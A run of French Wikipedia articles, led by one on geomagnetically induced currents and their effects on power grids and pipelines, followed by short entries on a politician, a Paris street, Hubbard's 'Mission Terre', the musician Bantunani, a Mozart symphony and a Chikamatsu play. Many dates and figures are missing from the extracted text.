Le champ magnétique terrestre connait des variations suivant différentes échelles de temps. Les variations longues, sur des périodes allant de quelques décennies au millénaire, résultent de la dynamo terrestre : l'effet dynamo appliqué au noyau terrestre.
Des variations géomagnétiques durant de quelques secondes à quelques années ont également lieu. Elles sont dues à des phénomènes dynamiques dans l'ionosphère, la magnétosphère et l'héliosphère liés à la météorologie spatiale et au cycle solaire en particulier.
Ce lien entre champ magnétique et activité solaire est utilisé notamment par la magnétotellurique pour étudier la structure terrestre.
Toutefois, ces courants induits sont avant tout une source de nuisances notamment pour les objets situés sous terre.
Description du phénomène.
La variation du champ magnétique terrestre induit un courant tellurique dans la partie conductrice du sol (en profondeur), créant lui-même en réaction un champ magnétique suivant la loi de Lenz-Faraday.
Ce champ à la surface, mesuré en V/km, induit à son tour un courant proche de la surface : les GIC qui s'écoulent dans les conducteurs à proximité comme les pipelines, les lignes électriques, de téléphone, les rails ou les câbles de communication.
Ces courants bien qu'alternatifs sont souvent décrits comme quasi-continus, leur fréquence étant faible, comprise entre et à comparer aux 50 ou du réseau électrique.
Les GIC présentent un risque pour les installations s'ils sont fréquents et/ou de forte amplitude. Leurs valeurs sont influencées par la topologie du conducteur électrique dans lequel ils s'induisent.
Les plus fortes amplitudes adviennent lors des plus fortes variations de courant dans l'ionosphère et la magnétosphère, qui sont la conséquence d'orages magnétiques.
La durée de ces variations est typiquement comprise entre quelques secondes et une heure, le processus d'induction implique le manteau et la lithosphère.
Les plus forts champs magnétiques sont observés dans les hautes latitudes magnétiques, en conséquence la présence de GIC est surveillée par les réseaux électriques canadiens et scandinaves depuis les années 1970.
Des GIC allant de ont été observés.
Durant les orages magnétiques de forte amplitude, des GIC ont également été mesurés aux latitudes moyennes.
Un risque dans les régions de basse latitude n'est pas à exclure, par exemple lors d'un orage situé du côté ensoleillé de la Terre, démarrant soudainement avec une période de variation faible.
Découverte et prise de conscience du problème.
Le phénomène est connu depuis les années 1850, quand on remarqua que les lignes de télégraphe pouvaient parfois fonctionner durant les orages magnétiques sans alimentation ou bien quand la liaison était brouillée par l'influence des GIC. Ainsi l'orage magnétique de septembre 1859 produisit des perturbations dans l'ensemble du système télégraphique européen. À l'époque on parlait de (batterie céleste).
La relation entre les phénomènes magnétiques dans le sol, les aurores polaires et le soleil a été démontrée dès la fin du . Enfin la conquête spatiale dans les années 1950 permit de mesurer et de comprendre en détail les différentes interactions.
Une importante éruption solaire causa le une coupure d'électricité dans le réseau d'Hydro-Québec. En l'espace de quelques secondes, les relais de protection du réseau se sont déclenchés en cascade sans raison apparente. Six millions d'utilisateurs ont été privés d'électricité pendant . Cela a fait prendre conscience aux gestionnaires du réseau de l'importance du problème.
Une autre coupure de courant due au GIC eut lieu à Malmö le . Les relais de protection trop sensibles à la troisième harmonique de la tension sont en cause.
Influence sur le réseau électrique.
Les lignes à haute tension permettent d'acheminer l'électricité depuis les centrales électriques vers les consommateurs. Pour limiter les pertes, la tension est élevée et la résistance des lignes la plus faible possible, mais cette faible résistance est favorable à la création de GIC.
Les transformateurs sont particulièrement sensibles au courant continu ou quasi-continu, qui les alimente. Le courant induit géomagnétiquement entre dans les enroulements du transformateur puis ressort par sa connexion à terre, étant continu donc homopolaire. Il engendre au passage une magnétisation supplémentaire qui, pendant les demi-cycles au cours desquels la magnétisation du courant alternatif est dans la même direction, peut saturer le noyau du transformateur. Cette saturation, en plus de produire des harmoniques qui déforment le courant et consomment de la puissance réactive, conduit à un échauffement du circuit magnétique du transformateur et à une détérioration de celui-ci en général. Par ailleurs le flux de fuite du transformateur augmente également.
Par ailleurs la puissance réactive doit être compensée, sous peine d'avoir une chute de tension. En fonction du type de transformateur, les GIC peuvent poser plus ou moins de problèmes. Une conception adaptée peut permettre au transformateur de supporter de forts courants continus. Le risque est réel, ainsi entre 2003 et 2004, plusieurs transformateurs sud-africains, dont certains à la centrale thermique de Lethabo, durent être mis hors service : des défaillances importantes ont été découvertes : échauffements, défauts dans les enroulements.
Depuis la panne de 1989, les sociétés gérant les réseaux électriques nord-américaines, britannique et du nord de l'Europe ont conduit une politique d'évaluation des risques et de mesure tout en tentant de minimiser les conséquences des GIC.
Des solutions ont été trouvées. Par exemple, l'installation d'un condensateur entre le point de neutre du transformateur et la terre permet de filtrer le courant continu (appelé ' en anglais). En comparaison avec une déconnexion pure et simple du point de neutre du transformateur de la terre, les ' ont l'avantage d'être transparents pour le réseau en cas d'absence de courant continu. Il n'est donc pas nécessaire d'ajouter de l'isolation au neutre.
Ce système a toutefois le défaut de ne faire que contourner le problème, le courant continu présent dans la ligne va tout de même retourner à la terre mais par un point de neutre différent, typiquement en traversant un transformateur non équipé d'un "".
Un changement de stratégie de maintenance est également possible. Des dispositifs permettant de répondre rapidement à l'augmentation de la puissance réactive peuvent être envisagés, par exemple de type FACTS, ou simplement grâce aux centrales électriques. Enfin une réduction de la charge peut également être envisagée, mais cette solution n'est pas efficace, les GIC étant d'un autre ordre de grandeur que le courant magnétisant du transformateur.
Toutefois la plupart de ces solutions sont chères ou peu pratiques.
Les stations connectant de nombreuses lignes sont plus sensibles, les GIC des différentes lignes s'additionnant.
On a longtemps cru que les transformateurs à trois colonnes bobinés sans colonne de retour de flux, n'offrant pas de chemin de retour pour le flux homopolaire, étaient insensibles aux effets des GIC. Les expériences en Afrique du Sud ont démontré le contraire. Les inductances connectées à la terre sont également vulnérables aux GIC.
Pour comprendre le comportement des GIC dans le réseau, une étude en courant quasi-continu doit être menée.
Elle doit être combinée à une étude géophysique de la terre, afin de déterminer le champ électrique en surface. Ainsi un sol avec une forte résistivité sous la station ou la proximité de la mer empire le phénomène.
Il faut pour cela modéliser la conductivité de la terre et la source de courant dans l'ionosphère.
La complexité du réseau électrique, de la source de courant et du modèle pour la conductivité de la terre rendent toutefois les résultats peu précis, quoiqu'assez fidèle.
L'analyse des orages magnétiques de forte amplitude permet cependant de connaître les points faibles du réseau, de créer des scénarios et finalement d'envisager des mesures adaptées.
Les gestionnaires de réseau concernés suivent la météorologie spatiale afin d'être prêts pour les événements critiques sans pour autant prendre des mesures disproportionnées en temps normal.
Les prévisions permettent actuellement d'anticiper les éjections de masse coronale (CME) de un à trois jours à l'avance. Cette durée dépendant de la vitesse de l'éjection.
Par la suite, le vent solaire est mesurée par un satellite au point de Lagrange. Son changement brutal précède la CME d'environ 20 à . Entre l'émission de la CME par le soleil et l'apparition des GIC sur terre, s'écoule un délai d'environ trois jours.
Influence sur les pipelines.
Les pipelines sont à la fois nombreux et généralement extrêmement longs, ils sont donc victimes des GIC. Ils sont construits en acier afin de contenir le liquide sous haute pression, et sont protégés de la corrosion par une enveloppe.
Des dommages dans cette couche de protection peuvent permettre à l'air ou au sol d'entrer en contact avec l'acier, produisant de la corrosion.
Une protection cathodique est utilisée pour minimiser ce problème. Elle maintient le tube à un potentiel négatif par rapport au sol.
La valeur de ce potentiel est déterminée par les propriétés électro-chimiques du sol en contact avec le tube.
Les GIC causent des oscillations de ce potentiel tube-sol et aggravent ainsi la corrosion, provoquant une usure prématuré du pipeline.
Le réseau de pipeline peut être modélisé de manière similaire au réseau électrique, par exemple en modélisant le potentiel pipe-sol à chaque point du tube.
Ce modèle est assez complexe, chaque embranchement, chaque coude doit être modélisé, tout comme l'isolation électrique entre chaque section du pipeline.
Les GIC peuvent également fausser les mesures de contrôle des protections cathodiques.

</doc>
<doc id="6806536" url="https://fr.wikipedia.org/wiki?curid=6806536" title="L'Ennemi intérieur">
L'Ennemi intérieur

L'Ennemi intérieur peut désigner :

</doc>
<doc id="6806538" url="https://fr.wikipedia.org/wiki?curid=6806538" title="Basilique Ta' Pinu de Gozo">
Basilique Ta' Pinu de Gozo



</doc>
<doc id="6806545" url="https://fr.wikipedia.org/wiki?curid=6806545" title="Marcel Rauline">
Marcel Rauline

Marcel-Albert Rauline, né le à Saint-Lô et mort le à Paris, est un homme politique français.
Biographie.
Fils de Gustave Rauline, il devient vérificateur à la Banque de France. Il est élu conseiller général du canton de Marigny et député de la Manche en remplacement de son père en 1904.
Réélu député en 1906, 1910 et 1914, il devient secrétaire de la Chambre en 1914.

</doc>
<doc id="6806547" url="https://fr.wikipedia.org/wiki?curid=6806547" title="Rue de la Main-d'Or">
Rue de la Main-d'Or

La rue de la Main-d'Or est une voie située dans le quartier Sainte-Marguerite du de Paris, en France.
Situation et accès.
La rue de la Main-d'Or est une courte voie reliant la rue Trousseau au passage de la Main-d'Or. 
Origine du nom.
Le passage tire son nom de l'enseigne d'une auberge qui se trouvait dans le passage de la Main-d'Or.
Historique.
La voie est ouverte en 1893 par un certain Carnaud entre le passage homonyme et la rue Trousseau. Elle est classée dans la voirie de Paris par arrêté du .

</doc>
<doc id="6806553" url="https://fr.wikipedia.org/wiki?curid=6806553" title="Charles Coltman-Rogers">
Charles Coltman-Rogers

Charles Coltman-Rogers, né en 1854 et mort en 1929, est un botaniste britannique spécialiste des "Pinaceae". Il est élu membre de la Linnean Society of London, le . Il est brièvement député du Royaume-Uni du Parti libéral pour la circonscription de Radnor.

</doc>
<doc id="6806555" url="https://fr.wikipedia.org/wiki?curid=6806555" title="Coltm.-Rog.">
Coltm.-Rog.



</doc>
<doc id="6806563" url="https://fr.wikipedia.org/wiki?curid=6806563" title="Shambala (peuple)">
Shambala (peuple)

Les Shambala sont un peuple d'Afrique de l'Est établi au nord-est de la Tanzanie, dans les monts Usambara. Ils sont proches des Pare et des Mbugu.
Ethnonymie.
Selon les sources, on observe quelques variantes : Sambaa, Sambala, Sambara, Shambaa, Shambala, Washambala, Washambara.
« Shambala » désigne parfois un ensemble de peuples, ou seulement l'un d'entre eux, considéré alors comme un sous-groupe des Shambaa.
Histoire.
Le royaume Shambala, ou Usambara, est un royaume fondé au dans les monts Usambara, au nord de l’actuelle Tanzanie. Dirigé par la dynastie Kilindi, il connait une période de stabilité et d’expansion qui forge l'identité et les structures sociales Shambala. Les conflits de succession et les rivalités entre faction entament le démantèlement du royaume. À la fin du , l’occupation coloniale allemande s'impose et met fin au royaume. La dynastie traditionnelle perture et est finalement dissoute en décembre 1962 par le gouvernement du Tanganyika.
Langue.
Leur langue est le shambala, une langue bantoue, dont le nombre de locuteurs était estimé à en 2001.

</doc>
<doc id="6806565" url="https://fr.wikipedia.org/wiki?curid=6806565" title="Politique de l'Irlande du Nord">
Politique de l'Irlande du Nord



</doc>
<doc id="6806567" url="https://fr.wikipedia.org/wiki?curid=6806567" title="Geomagnetically induced currents">
Geomagnetically induced currents



</doc>
<doc id="6806568" url="https://fr.wikipedia.org/wiki?curid=6806568" title="Mission Terre">
Mission Terre

Mission Terre (en version originale : "") est une « décalogie » écrite par L. Ron Hubbard et publiée au cours de la seconde moitié des années 1980.
Le nombre d'ouvrages parus (dix) en un temps relativement court (entre 1985 et 1987), et à un moment où Ron Hubbard était gravement malade, a pu laisser penser qu'il n'avait pas rédigé lui-même les dix tomes de la série, se contentant d'en avoir fixé les « grandes lignes ». Au demeurant, huit des dix tomes ont été publiés après la mort de Ron Hubbard, survenue en .
En livre de poche, l'ensemble de la suite romanesque comprend environ .
Romans de la série.
La série romanesque comprend 92 parties, réparties en dix tomes :
Thème de la série.
Sur la planète Voltar, le sinistre Lombar Hisst, chef de l'organisation gouvernementale secrète de l'Appareil, a décidé d'envoyer sur la planète Blitho P-3 (la Terre) un de ses agent secret sans états d'âme, Soltan Gris, afin de le ravitailler en drogue.
Il charge aussi Gris de neutraliser Jettero Heller, un capitaine de la Flotte de Voltar envoyé sur la Terre pour voir si cette planète serait apte à intégrer la Fédération Voltarienne et si l'on pourrait empêcher ses habitants de s'autodétruire : en effet, pour garantir son approvisionnement en drogue, Hisst est persuadé qu'il ne faut surtout pas que le gouvernement de Voltar apprenne que les humains ont acquis les aptitudes à intégrer la Fédération.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va peu à peu complètement rater sa mission...
Les romans de la série ne sont pas dénués d'un certain humour, l'auteur faisant de Soltan Gris un anti-héros gaffeur et malchanceux plus que convaincant.
Temps et lieux de l'action.
L'action des romans se déroule principalement sur Terre en Turquie, à Afyonkarahisar (« Afyon » dans le roman), où les Voltariens disposent d'une base et se livrent au trafic d'héroïne, et aux États-Unis (principalement à New York et dans le New Jersey), théâtre des opérations de Jettero Heller.
L'action se situe dans une uchronie dont le point de divergence se serait formé à la fin du ou au début du . En effet, dans l'histoire américaine telle qu'on la connaît, le milliardaire John Davison Rockefeller (« John Delbert Rockecenter » dans le roman) a dû, en raison du Sherman Antitrust Act promulgué le , scinder en 1911 son entreprise monopolistique Standard Oil en sept entités distinctes. La loi dite Clayton Antitrust Act de 1914 a renforcé et pérennisé les mesures anti-trusts.
L'auteur situe l'action des personnages dans une Terre où le descendant du milliardaire, toujours à la tête de son conglomérat resté entier, aurait le monopole de la production et de la vente du pétrole en Amérique, et serait propriétaire des principales entreprises du pays tout en ayant sous son autorité une grande partie du personnel politique et médiatique des États-Unis.
La période est située dans le dernier tiers du , à un moment où la technologie informatique est encore balbutiante (internet n'existant pas encore), et où le pétrole est la principale source d'énergie électrique et calorifique. On peut donc situer l'époque de cette série de romans uchroniques aux alentours de la fin des années 1970 et du début des années 1980.
L'Appareil de Coordination de l'Information.
Soltan Gris fait partie d'un organisme gouvernemental secret dénommé « Appareil de Coordination de l'Information » (en résumé « l'Appareil »), placé sous les ordres du sinistre Lombard Hisst.
Les membres de l'Appareil sont souvent qualifiés d'« ivrognes » par les autres forces de l'État voltarien (Flotte, Police intérieure, Militaires).
Le terme « Appareil de Coordination de l'Information », en trois mots, évoque la célèbre Central Intelligence Agency (CIA) américaine dont il reprend le sigle, légèrement dans le désordre.
Quelques années auparavant, L. Ron Hubbard, dans son roman "Terre champ de bataille" (1982), faisait état du « Bureau Impérial d'Enquête » (Imperial Bureau of Investigations), dont le nom semblait calqué sur celui du Federal Bureau of Investigation, appelé couramment le FBI.
Autour de la série.
Rapport avec la scientologie.
L'auteur de "Mission Terre", L. Ron Hubbard, est aussi le créateur de l'Église de Scientologie. Lorsque les dix volumes de la série de romans ont été publiés, cette Église existait depuis une trentaine d'années.
On peut donc s'interroger sur le fait de savoir si Ron Hubbard a voulu, soit explicitement, soit implicitement de manière subliminale, « faire passer » certains messages issus de la scientologie dans ces romans.
Psychiatrie et psychologie.
"Mission Terre" insiste à divers endroits (par le récit de Soltan Gris) sur les comportements néfastes des psychiatres et psychologues qui utilisent la psychiatrie et la psychologie sur la planète Terre.
Ce point avait été relevé quelques années auparavant dans sa précédente saga, "Terre champ de bataille", dans lequel le lecteur pouvait voir les méchants "Psychlos", venus de la planète Psychlo, lutter contre les gentils humains. À cette occasion, on pouvait s'interroger si les Psychlos ne faisaient pas référence à la psychologie : fallait-il voir une lutte entre les « méchants Psychlos (psychologues) » et les « bons humains », bref une lutte opposant les « Psycho(logue)s » aux « Sciento(logue)s » ?
Concernant "Mission Terre", il n'y a pas de références explicites à la doctrine scientologue ; cependant, la dénonciation récurrente par l'auteur des prétendus « méfaits » de la psychologie et de la psychiatrie n'est pas neutre sur un plan littéraire, social, médical, ou politique. Il semble même que, sur ce point, l'auteur n'a pas hésité à indiquer le fond de sa pensée, d'autant plus que la thématique de l’« anti-psychiatrie » est ancienne dans l’Église de scientologie.
Homosexualité.
De même, L. Ron Hubbard décrit de manière particulièrement péjorative les homosexuels, qui sont assimilés à des personnes efféminées et lâches, ce qui pourrait accréditer la thèse d'un auteur homophobe.
Les extraterrestres, ancêtres des humains ?
"Mission Terre" évoque à plusieurs reprises l'idée selon laquelle les extraterrestres de Voltar ont colonisé des milliers de système stellaires durant les siècles passés. L'humanité, en tant que telle, ne serait qu'un produit local d'une espèce extraterrestre répandue dans toute la galaxie. Or, l’Église de scientologie a un fondement théorique identique, selon lequel l'humanité découlerait d'une antique race extraterrestre dont elle est le produit.
Par ailleurs la trame essentielle du roman consiste dans la surveillance et le contrôle des humains et de leur civilisation par des extraterrestres, qui ne veulent pas que l'espèce humaine se détruise. Ce sujet est encore en lien direct avec la doctrine scientologue selon laquelle les extraterrestres sont présents non loin de nous dans la galaxie, ceux-ci attendant de revenir prendre contact avec l'humanité quand celle-ci sera suffisamment « mature ».
Tentative de censure.
En 1991, la ville de Dalton en Géorgie a tenté d'enlever les livres de "Mission Terre" de sa bibliothèque publique, la série étant décrite . La tentative n'a pas abouti, bien que cela a placé la série "Mission Terre" dans la catégorie des qui ont été contestés aux États-Unis.
Controverse sur les ventes.
Les livres de la série "Mission Terre" ont été un succès commercial majeur, en particulier les premiers volumes de la série, avec tous les volumes individuels atteignant la liste des best-sellers du "New York Times".
Cependant, la mesure dans laquelle celle-ci reflète la popularité réelle de la série est fortement remise en question. Un grand nombre de libraires, de directeurs de publication et d'anciens scientologues déclarent que, comme d'autres livres de Hubbard, l'Église de Scientologie a lancé une vaste campagne d'achat de livres, similaire à la campagne de promotion de la série "Terre champ de bataille" afin de la promouvoir comme un best-seller de la littérature. Des histoires de livres envoyés à des magasins portant les étiquettes de prix d'autres magasins ont circulé à travers la communauté des fans de science-fiction.
En deux ans, Hubbard a enregistré 14 livres consécutifs sur la liste du "New York Times". Adam Clymer, un cadre de ce journal, a déclaré que, alors que les livres ont été vendus en nombre suffisant pour justifier leur statut de best-seller, . Il a déclaré que le journal n'a découvert aucun cas dans lequel de grandes quantités de livres auraient été vendues à des individus isolés.
Distinctions.
"Mission Terre" s'est vu attribuer le prix Cosmos 2000 en 1989.

</doc>
<doc id="6806569" url="https://fr.wikipedia.org/wiki?curid=6806569" title="Bantunani">
Bantunani

Michel Nzau Vuanda, dit Bantunani, né le 15 mars 1976 à Kinshasa (République démocratique du Congo), est un **auteur-compositeur-interprète, producteur, réalisateur et écrivain** franco-congolais.
Le nom Bantunani désignait à l’origine un **groupe de musique** fondé au début des années 2000 par Michel Nzau, réunissant plusieurs musiciens autour d’un projet mêlant funk, rumba et musiques électroniques. Avec le temps, ce nom devient le **pseudonyme artistique** de Michel Nzau lui-même, sous lequel il signe désormais ses œuvres musicales, visuelles et littéraires.
Michel Nzau, parfois surnommé le « Dandy Dansant », est reconnu pour ses **talents de danseur**, le **timbre singulier** de sa voix, ses **performances scéniques** et le **caractère engagé** et philosophique de certaines de ses chansons.
Sa musique est un mélange éclectique d’**électro-funk**, de **soul**, de **reggae** et de rumba moderne, traversée par un **groove dansant et philosophique** qui donne naissance à son propre style : l’**afrofunk** et la **Nu Rumba**.
En parallèle à sa carrière musicale, Michel Nzau s’affirme comme **écrivain**, notamment à travers la trilogie *Révélation Interdite*, publiée aux **Éditions Muse** et coécrite avec **Christine Dufrénois** et **Isha Shemsou-Hor**. Cette œuvre mêle philosophie, ésotérisme et mémoire africaine, prolongeant les thématiques de son œuvre musicale.
Bantunani est un artiste **militant**, à la fois **africain et cosmopolite**, incarnant pleinement la vision **afropolitaine**.
Nom.
Bantunani serait formé de "bantu", un terme issu du lingala signifiant les hommes ou les humains, et de "nani", un pronom interrogatif qui signifie "Qui".
La référence à la civilisation Bantu suggère le désir de l'artiste de perpétuer par son style musical une histoire africaine, surtout congolaise, souvent méconnue. L'artiste se réclame ainsi du Kibantu, pluriel de kimuntu, philosophie africaine (centrée sur ce qui forme l'être ou l'être en devenir) qui se rapproche de la pensée de Nietzsche « Deviens ce que tu es » à qui il a consacré son troisième album "AcousticFear" (2012).
Biographie.
Michel Nzau alias Bantunani vient de la banlieue de Kinshasa. À l’âge de six ans, il part en Europe. Il connaît d’abord le Portugal et l’Italie avant d’atteindre la France en décembre 1982. Sa famille s’installe alors à Limoges.
Après le baccalauréat, il poursuit d’abord des études de droit à la Faculté d’Orléans, puis s’oriente vers les nouvelles technologies de communication. Il se spécialise dans la sécurité informatique et le système d’exploitation Linux.
En 2002, Il crée la société Vizualiz. En 2005, il fonde son propre label musical Blackninja Publishing qui élargit la sphère d'influence artistique de Bantunani.
Bantunani réunit de nombreux artistes avec lesquels il joue avec les codes de l’afrogroove.
Engagement.
Selon le "matin.ma", Michel Nzau est « connu comme un artiste engagé » ; ainsi, dans « Coltan Rush » et « Kivustan », . Il dénonce également l'exploitation abusive du sous-sol congolais dont la majeure partie du peuple ne bénéficie pas. La protestation trouve son apogée avec deux concerts parisiens au Comedy Club et à la Bellevilloise, à Paris. Cet engagement, qui dénonce les violences causées par les gisements de Coltan au Kivu, trouve son expression dans les titres ColtanRush, « Kivustan » et Kinshasa Voice.
Selon "Libération", les textes de Bantunani sont « socialement concernés ».
Cet engagement prend une forme pédagogique en 2018, lorsqu'en RDC, Bantunani crée le programme La Lettre Française, diffusée sur B One et la RTNC. Expérience sur laquelle il est revenu sur RFI dans l'émission "De vive voix" le 6 Juin 2022 et sur le désir d'une « Francophonie heureuse », à l'occasion de la sortie du single "Francofolie".
Style musical.
Selon Doc Pilot, .
Bantunani est à « la croisée des musiques africaines et noires américaines » selon le site "Afrik.com" ; il chante dans différentes langues et considère ce plurilinguisme comme porteur d'un message humaniste.
"Moonkinjazz" (2019) est un opus qui fait intervenir des rythmes venant de la rumba, du jazz, de la pop musique.
"Perspectives" (2020) réunit le groove, le funk et la rumba congolaise à la musique gnaoua du Maroc.
"Superstar" (2021) est un single dans l'album éponyme qui mêle disco et "transe voodoo".
Les deux titres "Next Generation" et "The Reality" (2022) associent électro-disco et beat West Coast « avec quelques relances trap ». Selon Bantunani, "The Reality" emprunte au dub de DJ Kingston, au beat gangsta rap de la West Coast, au dancehall, au reggae, au trap.
Collaborations.
L'ingénieur du son occupe une place centrale dans le processus de création de Bantunani. Il travaille avec Sefi Carmel, James Auwarter, qui a notamment travaillé avec Kanye West, Sam WheatJean-Loup Morette, ("Thriller") et .
Aux côtés de ses musiciens historiques Johnny Pululu (batteur et percussions), Koshi Niwa (bassiste) et Umberto Luambo (guitariste), Bantunani accorde une place prépondérante à ses enfants qui, depuis leur enfance, baignent dans la musique. Élèves de l'école de musique de Pont-Audemer, de l'INA (Kinshasa), de l'école Normale de Mers-Sultan (Caablanca- Maroc), du conservatoire d'Orléans depuis 2021, ils font une synthèse entre l'enseignement oral et écrit de la musique. On retrouve Matteo Nzau au piano et à la basse, Térence Nzau à la batterie et à la guitare et Maria Nzau à l'alto et au chant. Dans le sillage de Bantunani, ils forment un groupe, The Mininani's. Leur single au titre éponyme "Mininani's" sort en 2018 dans l'album "Musicalist". Ils apparaissent ensuite régulièrement en featuring sur les albums "Musicalist" (2018), "Moonkinjazz" (2019), "Perspectives" (2020) et "Cosmogony" (2022).
Rumba Lounge, Discovering Nu-Rumba.
En 2007, l'aventure musicale de Bantunani se concrétise à travers la gestation d'un premier opus, "Rumba Lounge, Discovering Nu-Rumba", à la suite de la rencontre de plusieurs musiciens de la scène congolaise de Ménilmontant, tels Umberto Luambo, guitariste, neveu de Franco Luambo, Johnny Pululu (batteur).
Ce premier album prend vie aux Studios Davout, grâce au soutien de Gilbert Castro (Rue Stendhal).
Africanization (2010).
Sorti en 2010, le deuxième album de Bantunani confirme l'éclectisme musical de l'artiste et s'écarte de la Nu- Rumba. On retrouve ainsi une guitare manouche, du ragga ou du rock progressif selon les titres. Quant au titre de l'album, "Africanization", l'artiste dans Jeune Afrique, l'associe à un processus qui consiste pour l'occident à reprendre et reproduire des modèles africains dans l'alimentation et les manières de vivre, non sans une certaine arrière-pensée que révèle le titre Coltan Rush qui dénonce le pillage des ressources de la RDC.
Anthropic (2024).
Deux ans après l'album Cosmogony dont quatre singles ont approché le million de vues, Bantunani sort son 15 ème album solo, "Anthropic", mais en présentant également "Disconnect ", premier album du Misato - groupe composé des trois enfants de l'artiste. Les enfants de Bantunani ont reçu une formation musicale dans les conservatoires de Kinshasa, Casablanca et Orléans ; ils sont multi-instrumentistes et accompagnent régulièrement Bantunani sur scène.
Discographie.
Albums studio

</doc>
<doc id="6806578" url="https://fr.wikipedia.org/wiki?curid=6806578" title="Un visage pour l'éternité">
Un visage pour l'éternité

Un visage pour l'éternité (titre original : "") est le dernier roman de C. S. Lewis, paru en 1956. La dernière réédition en France porte le titre de "Tant que nous n'aurons pas de visage".
Présentation.
Il s'agit d'une relecture du mythe grec d'Éros et Psyché, une histoire qui fascinait Lewis depuis longtemps, et qu'il avait tenté à plusieurs reprises de s'approprier, en prose ou en vers. Il choisit de prendre le point de vue de la sœur aînée de Psyché, qu'il appelle "Orual".

</doc>
<doc id="6806582" url="https://fr.wikipedia.org/wiki?curid=6806582" title="Till We Have Faces">
Till We Have Faces



</doc>
<doc id="6806583" url="https://fr.wikipedia.org/wiki?curid=6806583" title="Symphonie no 27 de Mozart">
Symphonie no 27 de Mozart

La Symphonie en sol majeur, , a été écrite par Wolfgang Amadeus Mozart à Salzbourg en à l'âge de dix-sept ans.
Instrumentation.
L'œuvre est écrite pour deux flûtes, deux cors, et cordes.
Structure.
La symphonie comprend trois mouvements :
Durée : environ 
Introduction de l"'Allegro" :
\relative c {
 \version "2.18.2"
 \tempo "Allegro"
 \key g \major
 \time 3/4
 &lt;g b, d,&gt;4\f q q |
 q4 r8 g16 a \grace c16 b8 a16 g |
 c2( fis,4) |
 g4 r8 g16 a \grace c b8 a16 g |
 c2( fis,4) |
 g4 r8 b16 a \grace a g8 fis16 e |
 d2 c8.(\trill b32 c) |
 b4
&lt;/score&gt;
Introduction de l"'Andantino grazioso" :
\relative c" {
 \version "2.18.2"
 \key d \major
 \time 2/4
 \tempo "Andantino grazioso"
 \partial 4 b16\p^\markup {\italic {con sordini}} (a) g (fis)
 fis8-. fis-. b16 (a) g (fis)
 fis8-. fis-. d'16 (cis b a)
 g8. (a16 b8) b-!
 gis8 (a) b16 (a) g (fis)
 e8-. e-. fis-. fis-.
 g8. (a16) \grace cis16 (b8) a16 g
 fis16 (d) fis (a) a (g) g (fis)
 fis8 (e)
&lt;/score&gt;
Introduction du "Presto" :
 \relative c" {
 \version "2.18.2"
 \key g \major
 \tempo "Presto"
 \time 3/8
 g4.\p c fis g
 r8 c, c
 b c d
 e-! a, (g)
 fis4 r8
 r8 g'\f fis
 \relative c" {
 \key g \major
 \time 3/8
 g,8\p g' fis
 e a16 g fis e
 d8 d' c
 b c16 b a g
 fis8 e d
 g, a b
 c4 cis8
 d16 e d c! b a
 g4 r8
»
&lt;/score&gt;

</doc>
<doc id="6806584" url="https://fr.wikipedia.org/wiki?curid=6806584" title="Charles Leweck">
Charles Leweck

Charles Leweck (né le ) est un footballeur luxembourgeois.
Carrière.
Leweck est issu du centre de formation des Young Boys Diekirch. En 2003, il est transféré au club de l'Etzella Ettelbruck et y joue 7 saisons, au cours desquelles il inscrit 25 buts en 147 matches et atteint la finale de la Coupe du Luxembourg en 2004. 
En 2010, il quitte le nord pour jouer à la Jeunesse d'Esch et rejoint ainsi son frère Alphonse, mais il n'y reste qu'une saison et revient finalement à Ettelbruck. 
Il est international luxembourgeois entre 2004 et 2013. Il honore sa première sélection le lors d'un match contre les îles Féroé (défaite 2-4). Il joue au total 40 matchs avec la sélection.

</doc>
<doc id="6806588" url="https://fr.wikipedia.org/wiki?curid=6806588" title="Église Notre-Dame-des-Victoires de La Valette">
Église Notre-Dame-des-Victoires de La Valette



</doc>
<doc id="6806592" url="https://fr.wikipedia.org/wiki?curid=6806592" title="Le Courrier pour l'Enfer">
Le Courrier pour l'Enfer

 est une pièce suicide d'amour ("shinjū") du grand dramaturge japonais Chikamatsu Monzaemon, écrite en 1711. Elle suit une intrigue similaire à certaines de ses autres pièces d'« amour-suicide », dont "Suicides d'amour à Sonezaki" et "Suicides d'amour à Amijima". Le "Courrier pour l'Enfer" est basé sur des faits réels qui ont eu lieu à Osaka en 1710.
Argument.
"Le Courrier pour l'enfer" raconte l'histoire de Chubei, fils adoptif d'un courrier d'Osaka, qui est éperdument amoureux d'Umegawa la prostituée. Il commence à utiliser l'argent des clients pour racheter son contrat avant qu'un autre homme ne le fasse. Hachiemon, ami de Chubei, tente d'arrêter les comportements de Chubei en informant les collègues prostituées d'Umegawa et sa maîtresse de ce qui se passe, mais cela incite au contraire Chubei à briser le sceau qui fermait un sac de 300 pièces d'or appartenant à un samouraï important, crime passible de mort. Chubei et Umegawa s'enfuient ensemble d'Osaka et se dirigent vers la ville natale de Chubei, pour mourir ensemble dans les montagnes.
Acte 1.
La pièce s'ouvre sur un employé de la maison de messagerie Kameya qui traite avec des clients irrités parce que leurs livraisons d'argent en provenance de la capitale sont en retard. Le greffier s'excuse profusément auprès d'un jeune samouraï, disant que les expéditions sont retardées en raison de la pluie et qu'il aura bientôt son argent. La mère adoptive de Chubei exprime sa confusion et sa déception relativement aux nombreux retards de paiement et ses inquiétudes sur la réputation de leur maison de messagerie qui a toujours été remarquable jusqu'alors. Elle essaie de comprendre du clerc ce qui se passe car Chubei sort assez souvent. Elle exprime sa perplexité sur le fait que Chubei part avec trois paquets de mouchoirs et n'en rapporte aucun : « Comment peut-il se moucher autant ? ».
En réalité, Chubei, le fils adoptif de la propriétaire, détourne de l'argent des clients. Il a utilisé 50 pièces d'or en acompte sur l'achat du contrat d'Umegawa, une prostituée dont il est amoureux. Le narrateur nous informe que les tissus sont utilisés pour s'éponger après l'activité sexuelle. Chubei revient des quartiers de plaisir et se précipite dans la maison de son ami Hachiemon qui est là pour lui réclamer l'argent que lui doit Chubei. Chubei fait des excuses mais finit par se décomposer et avoue qu'il a dépensé l'argent de Hachiemon pour essayer de racheter le contrat d'Umezawa. Hachiemon dit qu'il est impressionné par le courage qu'il a fallu à Chubei pour faire sa confession et efface la dette. Cependant, comme il s'apprête à partir, la mère de Chubei sort et lui ordonne de donner son argent à Hachiemon. Comme il n'y a pas d'argent à donner, Chubei enveloppe un pot et le donne à Hachiemon. Sur l'insistance de sa mère, Chubei fait écrire un reçu d'argent à Hachiemon mais, comme celle-ci est analphabète, la note dit en fait qu'il n'a pas reçu d'argent.
